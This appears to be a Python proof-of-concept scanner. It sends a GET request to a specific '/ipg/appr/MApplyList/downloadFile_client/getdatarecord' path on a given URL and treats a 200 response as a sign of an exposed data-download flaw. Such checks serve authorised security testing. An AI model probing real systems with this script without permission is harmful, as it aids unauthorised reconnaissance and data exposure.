import requests
import argparse

def check(url) -> bool:
    try:
        result = False
        if url:
            response = requests.get(f"{url}/ipg/appr/MApplyList/downloadFile_client/getdatarecord")
            if response.status_code == 200: 
                result = True
    except Exception as e:
        print(f"Error: {e}")
    return result

def main():
    parser = argparse.ArgumentParser(description='Check if a URL is vulnerabled.')
    parser.add_argument('-u', '--url', type=str, help='URL to check', default=None)
    args = parser.parse_args()
    url = args.url
    if url:
        if check(url):
            print("URL is vulnerabled.")
        else:
            print("URL is not vulnerabled.")
    else:
        print("-u target No URL provided.")

if __name__ == "__main__":
    main()
